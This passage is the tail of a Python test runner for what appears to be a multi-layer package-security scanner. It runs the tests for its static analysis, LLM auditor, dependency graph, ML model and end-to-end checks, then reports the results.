        ("Layer 3: Static Analysis", test_layer3_static),
        ("Layer 4: LLM Auditor", test_layer4_llm),
        ("Layer 5: Dependency Graph", test_layer5_graph),
        ("ML Model", test_ml_model),
        ("Aggregator", test_aggregator),
        ("E2E: Benign Packages", test_e2e_benign_packages),
        ("E2E: Malicious Packages", test_e2e_malicious_packages),
        ("Stress Tests", test_stress),
        ("Infrastructure", test_infrastructure),
    ]

    for name, func in test_funcs:
        try:
            func()
        except Exception as e:
            fail(f"{name} — UNHANDLED EXCEPTION: {e}")
            traceback.print_exc()

    print_final_report()
    return 1 if RESULTS["broken"] else 0


if __name__ == "__main__":
    raise SystemExit(main())
